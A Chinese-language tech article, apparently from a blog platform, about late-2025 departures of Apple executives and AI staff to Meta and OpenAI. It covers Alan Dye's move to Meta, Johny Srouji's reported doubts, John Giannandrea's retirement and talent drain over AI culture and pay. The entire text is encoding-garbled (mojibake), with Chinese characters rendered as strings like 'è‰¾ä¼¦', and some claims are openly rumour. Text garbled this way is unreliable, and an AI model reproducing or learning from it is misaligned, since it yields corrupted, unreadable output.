<p>è‰¾ä¼¦ Â· æˆ´ï¼ˆAlan Dyeï¼‰ï¼Œè¿™ä¸ªåå­—å¯¹äºå¤–ç•Œå¯èƒ½ç¨æ˜¾é™Œç”Ÿï¼Œä½†åœ¨è‹¹æœå†…éƒ¨ï¼Œä»–æ˜¯ä¹”çº³æ£® Â· ä¼Šå¤«ï¼ˆJony Iveï¼‰ç¦»èŒåï¼Œç»´æŒè‹¹æœè½¯ä»¶ä¼˜é›…ä¸äººæ€§åŒ–çš„å®ˆé—¨äººã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23bbea403ba34dc288cfeacb3d1f367c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=RZAB5q1OYdUHcxq8Pz8T5LRGx3o%3D" alt="" loading="lazy"/></p>
<p>ä½œä¸ºäººæœºç•Œé¢è®¾è®¡å‰¯æ€»è£ï¼Œä»–ä¸»å¯¼äº† iOSã€watchOS ä»¥åŠé‚£ä¸ªä»¤äººæƒŠå¹å´åˆå……æ»¡äº‰è®®çš„ Vision Pro çš„ç•Œé¢è®¾è®¡ã€‚</p>
<p>ä»–åœ¨è‹¹æœåº¦è¿‡äº† 19 å¹´çš„å²æœˆï¼Œæ—©å·²å°†è¿™ç§æç®€ä¸»ä¹‰çš„å®¡ç¾åˆ»å…¥äº†éª¨é«“ã€‚</p>
<p>ä½†å°±åœ¨ 2025 å¹´æœ«ï¼Œè‰¾ä¼¦ Â· æˆ´å†³å®šç¦»å¼€ã€‚</p>
<p>ä»–çš„ä¸‹ä¸€ç«™ï¼Œæ˜¯ Metaã€‚</p>
<p>è¿™ä¸€è·³æ§½åœ¨ç¡…è°·å¼•å‘çš„éœ‡åŠ¨ï¼Œä¸äºšäºå½“å¹´å®‰ä¸œå°¼ Â· è±ä¸‡å¤šå¤«æ–¯åŸºä»è°·æ­Œè·³æ§½åˆ° Uberã€‚</p>
<p>ä¸ºä»€ä¹ˆæ˜¯ Metaï¼Ÿ</p>
<p>åœ¨å¾ˆå¤šè‹¹æœç²¾è‹±çœ¼ä¸­ï¼ŒMeta æ›¾æ˜¯ç²—ç³™ã€ç”šè‡³ç•¥å¸¦ä¸€ç‚¹ã€Œé‚ªæ¶ã€çš„æ•°æ®å…¬å¸çš„ä»£åè¯ã€‚</p>
<p>ä½†ç°å®æ˜¯ï¼Œæ‰å…‹ä¼¯æ ¼æ­£åœ¨ç”¨ä¸€ç§è¿‘ä¹ç–¯ç‹‚çš„æŠ•å…¥ï¼Œå°† Meta å˜æˆæ–°çš„ç¡¬ä»¶åˆ›æ–°å®éªŒå®¤ã€‚</p>
<p>éšåŒè‰¾ä¼¦ Â· æˆ´ä¸€åŒå‰å¾€çš„ï¼Œè¿˜æœ‰ä»–çš„å‰¯æ‰‹ã€åŒæ ·åœ¨è‹¹æœè®¾è®¡å›¢é˜Ÿä¸­ä¸¾è¶³è½»é‡çš„æ¯”åˆ© Â· ç´¢ä¼¦è’‚è¯ºï¼ˆBilly Sorrentinoï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a44a8863ea1483c9219a97bacad6812~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=xSovx%2BRaX1lRwJ9amQbQ3BCkqVM%3D" alt="" loading="lazy"/></p>
<p>è€Œåœ¨ä»–ä»¬ä¹‹å‰ï¼ŒMeta å·²ç»æŒ–èµ°äº†å¤§é‡è‹¹æœçš„è®¾è®¡éª¨å¹²ã€‚</p>
<p>è¿™åœºè®¾è®¡äººæ‰çš„è¿å¾™ï¼Œæ­ç¤ºäº†ä¸¤ç§è®¾è®¡å“²å­¦çš„ç¢°æ’ã€‚</p>
<ul>
<li><strong>ã€Œè‹¹æœæ¨¡å¼ï¼š</strong>ã€Œè¿½æ±‚çš„æ˜¯ã€<strong>ç¡®å®šæ€§çš„å®Œç¾ã€</strong>ã€‚æ¯ä¸€ä¸ªåœ†è§’ã€æ¯ä¸€ä¸ªåŠ¨ç”»å¸§ç‡ã€æ¯ä¸€ä¸ªé˜´å½±çš„æ·±åº¦ï¼Œéƒ½æ˜¯è¢«ç²¾å¿ƒè®¾è®¡å’Œæ§åˆ¶çš„ã€‚è®¾è®¡å¸ˆæ˜¯ä¸Šå¸ï¼Œç”¨æˆ·æ˜¯åœ¨ä¸Šå¸æ„å»ºçš„ä¼Šç”¸å›­é‡Œæ¼«æ­¥ã€‚</li>
<li><strong>Meta/****ã€ŒAIã€</strong> <strong>ã€Œæ¨¡å¼ï¼š</strong>ã€Œè¿½æ±‚çš„æ˜¯ã€<strong>ç”Ÿæˆå¼çš„å¯èƒ½æ€§ã€</strong>ã€‚åœ¨ AI æ—¶ä»£ï¼Œç•Œé¢ä¸å†æ˜¯é™æ€çš„ï¼Œè€Œæ˜¯æµåŠ¨çš„ã€ç”Ÿæˆçš„ã€‚è®¾è®¡å¸ˆä¸å†æ˜¯æ§åˆ¶æ¯ä¸€ä¸ªåƒç´ ï¼Œè€Œæ˜¯è®¾è®¡ä¸€å¥—è§„åˆ™ï¼Œè®© AI å»ç”Ÿæˆç•Œé¢ã€‚</li>
</ul>
<p>å¯¹äºåƒè‰¾ä¼¦ Â· æˆ´è¿™æ ·çš„é¡¶çº§è®¾è®¡å¸ˆæ¥è¯´ï¼ŒVision Pro è™½ç„¶ç²¾ç¾ï¼Œä½†å®ƒä¾ç„¶æ˜¯åœ¨æ—§èŒƒå¼ä¸‹çš„å·…å³°ä¹‹ä½œâ€”â€”å®ƒä¾ç„¶æ˜¯ä¸€å—å±å¹•ï¼ˆè™šæ‹Ÿå±å¹•ï¼‰ã€‚</p>
<p>è€Œ Meta çš„ Orion åŸå‹æœºå’Œæ‰å…‹ä¼¯æ ¼å¯¹ã€Œå…·èº«æ™ºèƒ½ã€çš„æ„¿æ™¯ï¼Œè™½ç„¶ç²—ç³™ï¼Œå´æä¾›äº†ä¸€å—æ›´ç‹‚é‡ã€æ›´å°‘æŸç¼šçš„ç”»å¸ƒã€‚</p>
<p>ä»–ä»¬åŒå€¦äº†åœ¨ 0.1 æ¯«ç±³çš„å€’è§’ä¸Šæ‰“ç£¨æ•°å¹´ï¼Œä»–ä»¬æ¸´æœ›å»å®šä¹‰ä¸‹ä¸€ä¸ªåå¹´çš„äº¤äº’è¯­è¨€â€”â€”é‚£ä¸ªæˆ–è®¸è¿å±å¹•éƒ½ä¸éœ€è¦çš„æœªæ¥ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20320d9d5a7f408095f187ac2859c728~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=6ZcXuOAUdlQ9qboPUEZTtm6CQjc%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ1.2 è–ªé…¬çš„æš´åŠ›ç¾å­¦ã€</strong></p>
<p>å½“ç„¶ï¼Œæƒ…æ€€ä¹‹å¤–ï¼ŒMeta çš„ã€Œé’èƒ½åŠ›ã€ä¹Ÿæ˜¯æ— æ³•å¿½è§†çš„å› ç´ ã€‚</p>
<p>æ®å†…éƒ¨æ¶ˆæ¯é€éœ²ï¼Œä¸ºäº†æŒ–è§’è‹¹æœçš„é¡¶çº§ AI å’Œè®¾è®¡äººæ‰ï¼ŒMeta å¼€å‡ºäº†ä»¤äººå’‹èˆŒçš„è–ªé…¬åŒ…ã€‚</p>
<p>æœ‰äº›æ ¸å¿ƒæ¶æ„å¸ˆçš„è½¬ä¼šè´¹åŠ ä¸Šé•¿æœŸè‚¡ç¥¨æ¿€åŠ±ï¼ˆRSUï¼‰ï¼Œå¹´å‡ä»·å€¼ç”šè‡³é«˜è¾¾ 2500 ä¸‡ç¾å…ƒã€‚</p>
<p>è¿™ç§è–ªé…¬ç»“æ„åæ˜ äº†æ‰å…‹ä¼¯æ ¼çš„æˆ˜æ—¶å¿ƒæ€ã€‚</p>
<p>ä»–åœ¨å†…éƒ¨å¤‡å¿˜å½•ä¸­æ›¾å¼•ç”¨ã€Œçˆ±å›½è€…å¯¼å¼¹ã€çš„æ¯”å–»ï¼Œè€Œåœ¨äººæ‰äº‰å¤ºä¸Šï¼Œä»–æ˜¾ç„¶æ˜¯åœ¨ç”¨æ ¸æ­¦å™¨ã€‚</p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œè‹¹æœè™½ç„¶å¾…é‡ä¼˜åšï¼Œä½†å…¶è–ªé…¬ä½“ç³»ç›¸å¯¹åƒµåŒ–ï¼Œä¸”éšç€è‚¡ä»·åœ¨é«˜ä½ç›˜æ•´ï¼ŒRSU çš„å¢é•¿æƒ³è±¡åŠ›å·²ä¸å¦‚å¤„äº AI çˆ†å‘å‰å¤œçš„ Meta æˆ– OpenAIã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a29119d3945446d68aeb0f6765096397~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=OucvMir3%2FQKRDtFdoPNSfSA6%2BS4%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç¬¬äºŒç« ï¼šã€Œé€ ç‰©ä¸»ã€çš„åŠ¨æ‘‡ã€</strong></p>
<p><strong>ã€ŒèŠ¯ç‰‡å¸å›½çš„éšå¿§ã€</strong></p>
<p>å¦‚æœè¯´è®¾è®¡å¸ˆçš„ç¦»å¼€æ˜¯å¤±å»äº†ã€Œé¢å­ã€ï¼Œé‚£ä¹ˆçº¦ç¿°å°¼ Â· æ–¯é²å‰ï¼ˆJohny Sroujiï¼‰çš„åŠ¨æ‘‡ï¼Œåˆ™å¯èƒ½è®©è‹¹æœå¤±å»ã€Œé‡Œå­ã€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6b12054b4a84031af357573140368d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=kNqajdKGFtjPLQz8bsFhwsOr5Jw%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fbcae9ed461479ab67681dca6fa39da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=dkTc3dLnzq1c2FITL2Zti4VDe4Y%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ2.1 æ²‰é»˜çš„åŸºçŸ³ã€</strong></p>
<p>åœ¨è‹¹æœç°æœ‰çš„é«˜ç®¡å›¢é˜Ÿä¸­ï¼Œæ²¡æœ‰ä»»ä½•ä¸€ä¸ªäººçš„ä¸å¯æ›¿ä»£æ€§åƒæ–¯é²å‰è¿™æ ·é«˜ã€‚</p>
<p>ä½œä¸ºç¡¬ä»¶æŠ€æœ¯é«˜çº§å‰¯æ€»è£ï¼Œä»–æ˜¯ä¸€å¼ æ²‰é»˜çš„ç‹ç‰Œã€‚</p>
<p>ä» 2008 å¹´åŠ å…¥è‹¹æœå¼€å§‹ï¼Œä»–ä¸€æ‰‹æ­å»ºäº† Apple Silicon å›¢é˜Ÿï¼Œä» A4 èŠ¯ç‰‡çš„ç‰›åˆ€å°è¯•ï¼Œåˆ° A ç³»åˆ—èŠ¯ç‰‡åœ¨ç§»åŠ¨ç«¯çš„ç‹¬å­¤æ±‚è´¥ï¼Œå†åˆ° M ç³»åˆ—èŠ¯ç‰‡è®© Mac æµ´ç«é‡ç”Ÿï¼Œå½»åº•æ‘†è„± Intel çš„æ£è‚˜ï¼Œæ–¯é²å‰æ˜¯è‹¹æœä¸‡äº¿å¸‚å€¼çš„æŠ¤åŸæ²³æŒ–æ˜è€…ã€‚</p>
<p>æ­£æ˜¯å› ä¸ºæœ‰äº†æ–¯é²å‰çš„èŠ¯ç‰‡ï¼Œè‹¹æœæ‰èƒ½åœ¨åŠŸè€—å’Œæ€§èƒ½ä¹‹é—´æ‰¾åˆ°é‚£ä¸ªä¸å¯æ€è®®çš„å¹³è¡¡ç‚¹ï¼Œæ‰èƒ½è®© MacBook Air åœ¨ä¸æ’ç”µçš„æƒ…å†µä¸‹å‰ªè¾‘ 8K è§†é¢‘ã€‚</p>
<p>ä»–æ˜¯ç¡¬ä»¶ä¸–ç•Œçš„ã€Œé€ ç‰©ä¸»ã€ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/725c30f25a234a55bc96cbfbfcb22c29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=7B8vCyQfNk%2FY51ZgJwGq90VUqCI%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ2.2 ã€Œé™¤äº† CEOï¼Œæˆ‘æ— å¤„å¯å»ã€ã€</strong></p>
<p>ç„¶è€Œï¼Œ2025 å¹´åº•çš„å¯’é£å¹è¿›äº†æ–¯é²å‰çš„åŠå…¬å®¤ã€‚</p>
<p>å½­åšç¤¾çˆ†å‡ºçŒ›æ–™ï¼šæ–¯é²å‰å·²å‘ŠçŸ¥è’‚å§† Â· åº“å…‹ï¼ˆTim Cookï¼‰ï¼Œä»–æ­£åœ¨ã€Œè®¤çœŸè€ƒè™‘ã€ç¦»å¼€è‹¹æœã€‚</p>
<p>è¿™å¹¶ä¸æ˜¯ä¸€æ¬¡æ™®é€šçš„é€€ä¼‘é¢„å‘Šã€‚</p>
<p>åŠé—´ä¼ é—»ï¼Œæ–¯é²å‰çš„æ€åº¦ç”šè‡³å¸¦æœ‰æŸç§å†³ç»çš„æ„å‘³ã€‚</p>
<p>è™½ç„¶ã€ŒMake me CEO or I quitã€è¿™æ ·çš„è¯´æ³•å¯èƒ½å¸¦æœ‰æˆå‰§å¤¸å¼ æˆåˆ†ï¼Œä½†å®ƒç²¾å‡†åœ°å‡»ä¸­äº†é—®é¢˜çš„æ ¸å¿ƒï¼šåœ¨è‹¹æœç°æœ‰çš„æƒåŠ›ç»“æ„ä¸­ï¼ŒæŠ€æœ¯å®˜åƒšçš„å¤©èŠ±æ¿å·²ç»è§¦é¡¶ã€‚</p>
<p>æ¥ç­äººè®¡åˆ’ä¼¼ä¹æ›´å€¾å‘äºç¡¬ä»¶å·¥ç¨‹ä¸»ç®¡çº¦ç¿° Â· ç‰¹åŠªæ–¯ï¼ˆJohn Ternusï¼‰æˆ–è¿è¥å‡ºèº«çš„é«˜ç®¡ï¼Œè¿™ç¬¦åˆåº“å…‹ä¸€è´¯çš„ã€Œç¨³å¥ã€é£æ ¼ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70711348e95f4914b9a869184ab5bf13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=2Ak5kG9%2FI0CcVX3oFwglHgofub8%3D" alt="" loading="lazy"/></p>
<p>å¯¹äºæ–¯é²å‰è¿™æ ·ä¸€ä½åœ¨æŠ€æœ¯é¢†åŸŸæ‹¥æœ‰ç»å¯¹æƒå¨çš„é¢†è¢–æ¥è¯´ï¼Œå¦‚æœæ— æ³•è§¦åŠæœ€é«˜æƒæ–ï¼Œè€Œæ— è®ºæ˜¯è‹±ç‰¹å°”ã€OpenAI è¿˜æ˜¯å…¶ä»–æ¸´æœ›è‡ªç ”èŠ¯ç‰‡çš„å·¨å¤´ï¼Œåˆæ„¿æ„æä¾›ä¸€ç‰‡å®Œå…¨å±äºä»–çš„æ–°é¢†åœ°ï¼Œç¦»å¼€ä¾¿æˆäº†ä¸€ä¸ªç†æ€§çš„é€‰é¡¹ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dee403c88a04680a0ff837cf0c1edc8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=JYJtETUylgpO0%2B%2BtpFpRVqfTRMo%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ2.3 å¤±å»æ–¯é²å‰çš„ã€Œè´è¶æ•ˆåº”ã€ã€</strong></p>
<p>æ–¯é²å‰è‹¥çœŸçš„ç¦»èŒï¼Œå…¶ç ´ååŠ›å°†æ˜¯æ ¸å¼¹çº§çš„ï¼Œä¸”å…·æœ‰æ»åæ€§ï¼š</p>
<ul>
<li>**æŠ€æœ¯æ–­å±‚ï¼š**èŠ¯ç‰‡ç ”å‘å‘¨æœŸé•¿è¾¾ 3-5 å¹´ã€‚æ˜å¹´çš„ iPhone 18 å¯èƒ½ä¸ä¼šå—å½±å“ï¼Œä½† 2028 å¹´çš„ 2nm ç”šè‡³ 1nm èŠ¯ç‰‡è§„åˆ’è°æ¥æ‹æ¿ï¼Ÿ</li>
<li>**äººæ‰é›ªå´©ï¼š**èŠ¯ç‰‡è®¾è®¡æ˜¯ä¸€ä¸ªé«˜åº¦ä¾èµ–ã€Œå°†æ‰ã€çš„é¢†åŸŸã€‚æ–¯é²å‰çš„å¨æœ›ç»´ç³»ç€ä¸€æ”¯ç”±ä»¥è‰²åˆ—æµ·æ³•ã€å¾·å…‹è¨æ–¯å¥¥æ–¯æ±€å’Œç¡…è°·ç²¾è‹±ç»„æˆçš„åºå¤§å†›å›¢ã€‚ä¸€æ—¦ä¸»å¸…ç¦»è¥ï¼Œè¿™æ”¯å†›å›¢ææ˜“è¢«é«˜é€šã€è‹±ä¼Ÿè¾¾æˆ–å¾®è½¯ä»¥é«˜è–ªæ‹†è§£ã€‚</li>
<li>**èµ„æœ¬åŠ¨è¡ï¼š**åå°”è¡—ä¹‹æ‰€ä»¥ç»™è‹¹æœé«˜ä¼°å€¼ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ç›¸ä¿¡å…¶ç¡¬ä»¶æ€§èƒ½çš„ç»å¯¹é¢†å…ˆã€‚ä¸€æ—¦è¿™ä¸€ä¿¡å¿µåŠ¨æ‘‡ï¼Œè‹¹æœçš„æº¢ä»·èƒ½åŠ›å°†å¤§æ‰“æŠ˜æ‰£ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9718f9f6620461e86100e0e371d6430~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=RkhmNWXIyV4FHioYfxi81O8vxZg%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç¬¬ä¸‰ç« ï¼šAI çš„è¿·é€”ã€</strong></p>
<p><strong>ã€Œä»ã€ŒSiri ä¹‹æ­»ã€åˆ°ã€ŒOpenAI ä¹‹é­…ã€ã€</strong></p>
<p>åœ¨ç¡…è°·ï¼Œæœ‰ä¸¤ç§ç¦»èŒï¼šä¸€ç§æ˜¯åŠŸæˆèº«é€€ï¼Œä¸€ç§æ˜¯åŠ›ä¸ä»å¿ƒã€‚</p>
<p>çº¦ç¿° Â· è©¹å—å¾·é›·äºšï¼ˆJohn Giannandreaï¼‰çš„é»¯ç„¶ç¦»åœºï¼Œæ— ç–‘å±äºåè€…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea718e7bde1c4e258e9a122b2776c748~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=0EyhwZFGz0secv4jq1InYzu%2Fqfo%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/820067b98a994ff083a24edaaf2c654d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=MefdCJwrfT4DaHRyeWxUbtp7%2FiU%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ3.1 å¤±å»çš„ä¸ƒå¹´ã€</strong></p>
<p>2018 å¹´ï¼Œå½“è©¹å—å¾·é›·äºšä»è°·æ­Œå¸¦ç€ã€ŒAI ç»Ÿå¸…ã€çš„å…‰ç¯åŠ å…¥è‹¹æœæ—¶ï¼Œå¤–ç•Œæ›¾å¯„äºˆåšæœ›ï¼Œè®¤ä¸ºä»–èƒ½æ‹¯æ•‘é‚£ä¸ªåªä¼šè®²å†·ç¬‘è¯ã€ç»å¸¸å¬ä¸æ‡‚äººè¯çš„ Siriã€‚</p>
<p>ç„¶è€Œï¼Œä¸ƒå¹´è¿‡å»äº†ï¼ŒSiri ä¾ç„¶æ­¥å±¥è¹’è·šï¼Œç”šè‡³åœ¨ ChatGPT æ¨ªç©ºå‡ºä¸–åæ˜¾å¾—æ›´åŠ åƒä¸€ä¸ªä¸Šä¸ªæ—¶ä»£çš„å¤è‘£ã€‚</p>
<p>2025 å¹´ 12 æœˆï¼Œè‹¹æœå®£å¸ƒè©¹å—å¾·é›·äºšå°†å¸ä»» AI/ML æˆ˜ç•¥é«˜çº§å‰¯æ€»è£ï¼Œå¹¶åœ¨ 2026 å¹´æ˜¥å­£é€€ä¼‘ã€‚</p>
<p>æ¥æ›¿ä»–çš„æ˜¯æ¥è‡ªå¾®è½¯å’Œè°·æ­Œçš„å‰é«˜ç®¡ Amar Subramanyaã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/427da377286245399f03186c20339a3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=UpHnwUya%2FMjU0c0v4ZBXtjfLioI%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯è‹¹æœå˜ç›¸æ‰¿è®¤å…¶ç¬¬ä¸€é˜¶æ®µ AI æˆ˜ç•¥çš„å…¨é¢æºƒè´¥ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02aab96ee5e645d887733c73d7e6ffea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=1Jj1mnDkAiJMXOCWlI496dCqBUY%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ3.2 æ–‡åŒ–çš„å›šå¾’ï¼šéšç§ä¹‹ä¸Šçš„ä»£ä»·ã€</strong></p>
<p>ä¸ºä»€ä¹ˆè°·æ­Œçš„ AI è´Ÿè´£äººåœ¨è‹¹æœä¼šã€Œæ°´åœŸä¸æœã€ï¼Ÿ</p>
<p>æ ¸å¿ƒçŸ›ç›¾åœ¨äº**ã€Œæ–‡åŒ–ã€**ã€‚</p>
<p>AI çš„è¿›æ­¥ï¼Œå°¤å…¶æ˜¯å¤§æ¨¡å‹æ—¶ä»£çš„è¿›æ­¥ï¼Œä¾èµ–äºæåº¦å¼€æ”¾çš„å­¦æœ¯äº¤æµã€å¼€æºç¤¾åŒºçš„åä½œå’Œå¤§è§„æ¨¡çš„æ•°æ®ååã€‚</p>
<p>OpenAI çš„æˆåŠŸæ­£æ˜¯å»ºç«‹åœ¨æŸç§ã€Œå…¬å¼€çš„ç–¯ç‹‚ã€ä¹‹ä¸Šã€‚</p>
<p>ä½†åœ¨è‹¹æœï¼Œ<strong>ã€Œä¿å¯†æ˜¯æœ€é«˜ä¿¡ä»°ï¼Œä¹Ÿæ˜¯ä¸€ç§è¡Œæ”¿å‘½ä»¤ã€</strong>ã€‚</p>
<ul>
<li>**å­¦æœ¯å­¤å²›ï¼š****è‹¹æœçš„ç ”ç©¶å‘˜è¢«ç¦æ­¢åœ¨ NeurIPSã€ICML ç­‰é¡¶çº§ä¼šè®®ä¸Šéšæ„å‘è¡¨è®ºæ–‡ï¼Œè¿™å¯¼è‡´ä»–ä»¬åœ¨å­¦æœ¯åœˆã€Œå¤±å£°ã€ã€‚**å¯¹äºé¡¶çº§ç§‘å­¦å®¶æ¥è¯´ï¼Œæ— æ³•å‘è¡¨è®ºæ–‡å°±æ„å‘³ç€åœ¨å­¦æœ¯ç•Œæ­»äº¡ã€‚è¿™ä½¿å¾—è‹¹æœéš¾ä»¥æ‹›å‹Ÿåˆ°é‚£äº›æœ€æœ‰é‡å¿ƒçš„åšå£«ç”Ÿã€‚</li>
<li>**ç®—åŠ›ä¹ä¸ï¼š**ä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ˜¯ï¼Œæ›¾æœ‰æŠ¥é“æŒ‡å‡ºï¼Œè‹¹æœå†…éƒ¨çš„ AI å›¢é˜Ÿç”šè‡³éœ€è¦å»ã€Œä¹æ±‚ã€è®¡ç®—èµ„æºã€‚è‹¹æœçš„æ•°æ®ä¸­å¿ƒæ¶æ„é•¿æœŸä»¥æ¥æ˜¯ä¸º iCloud å­˜å‚¨å’ŒæœåŠ¡è®¾è®¡çš„ï¼Œè€Œä¸æ˜¯ä¸ºå¤§æ¨¡å‹è®­ç»ƒè¿™ç§ååé‡æå¤§çš„ä»»åŠ¡è®¾è®¡çš„ã€‚å½“ Meta åœ¨å›¤ç§¯å‡ åä¸‡å— H100 æ˜¾å¡æ—¶ï¼Œè‹¹æœçš„å·¥ç¨‹å¸ˆè¿˜åœ¨ä¸º GPU é…é¢å‘æ„ã€‚</li>
<li>**Siri çš„æŠ€æœ¯å€ºï¼š**è©¹å—å¾·é›·äºšèŠ±è´¹äº†å¤§é‡æ—¶é—´å»ä¿®è¡¥ Siri é™ˆæ—§ã€åŸºäºè§„åˆ™çš„åº•å±‚ä»£ç ï¼Œè¯•å›¾åœ¨æ—§åœ°åŸºä¸Šç›–æ‘©å¤©å¤§æ¥¼ï¼Œè€Œä¸æ˜¯åƒ OpenAI é‚£æ ·æ¨å€’é‡æ¥ï¼Œç›´æ¥æ„å»ºåŸºäº Transformer çš„ç”Ÿæˆå¼æ¶æ„ã€‚</li>
</ul>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c4e3067c4c547dca7cd290c9bc0a4f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=30WsASgRCa266tWC1444T3DrXJY%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ3.3 äººæ‰æµå‘ OpenAIï¼šä¿¡ä»°çš„æ”¹å®—ã€</strong></p>
<p>ä¸æ­¤åŒæ—¶ï¼ŒOpenAI æˆä¸ºäº†è‹¹æœ AI äººæ‰çš„æœ€å¤§æ”¶å‰²æœºã€‚</p>
<p>æ®ç»Ÿè®¡ï¼Œä»…åœ¨ä¸€ä¸ªæœˆå†…ï¼Œå°±æœ‰æ•°ååè‹¹æœå·¥ç¨‹å¸ˆåŠ å…¥äº† OpenAI çš„ç¡¬ä»¶å’Œæ¨¡å‹å›¢é˜Ÿã€‚</p>
<p>è¿™å…¶ä¸­ï¼Œæœ€å¼•äººæ³¨ç›®çš„æ˜¯åºè‹¥é¸£ï¼Œä»–æ›¾æ˜¯è‹¹æœåŸºç¡€æ¨¡å‹å›¢é˜Ÿçš„è´Ÿè´£äººã€‚</p>
<p>æ‹“å±•é˜…è¯»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3MTA0MTk1MA%3D%3D%26mid%3D2652612050%26idx%3D2%26sn%3D94c99e55dadf2fc721bd8bac5ae390ef%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI3MTA0MTk1MA==&amp;mid=2652612050&amp;idx=2&amp;sn=94c99e55dadf2fc721bd8bac5ae390ef&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">å››å¹´ 2 äº¿ï¼Œè‹¹æœå¤©æ‰ç¦»èŒå†…å¹•é¦–æ›å…‰ï¼åºè‹¥é¸£å‘ç¦»èŒä¿¡å‘Šåˆ«ï¼Œè‹¹æœ AI å¤§æºƒè´¥</a></p>
